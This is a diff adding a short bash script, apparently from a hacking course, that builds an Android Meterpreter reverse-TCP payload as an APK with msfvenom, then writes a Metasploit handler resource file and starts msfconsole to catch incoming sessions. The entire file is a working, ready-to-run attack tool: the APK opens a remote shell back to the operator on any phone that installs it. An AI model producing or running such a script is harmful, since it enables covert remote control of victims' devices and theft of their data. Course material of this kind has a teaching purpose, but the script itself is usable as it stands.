@@ -1,0 +1,24 @@
+#!/usr/bin/bash
+echo "Made Only For This Course"
+read -p 'Set LHOST: ' lhost
+read -p 'Set LPORT: ' lport
+read -p 'Set Payload Name: ' name
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> Payload/$name.apk
+echo '.....................................................starting services...........................................' 
+service postgresql start
+
+
+ touch RC/hack.rc
+ rm RC/hack.rc
+            echo use exploit/multi/handler > RC/hack.rc
+            echo set PAYLOAD android/meterpreter/reverse_tcp >> RC/hack.rc
+            read -p 'Set LHOST: ' userhost
+            echo set LHOST $userhost >> RC/hack.rc
+            read -p 'Set LPORT: ' uservar
+            echo set LPORT $uservar >> RC/hack.rc
+            echo set ExitOnSession false >> RC/hack.rc
+            echo exploit -j >> RC/hack.rc
+            msfconsole -r RC/hack.rc &
+echo Starting Metaslpoit................
+exit 0
+
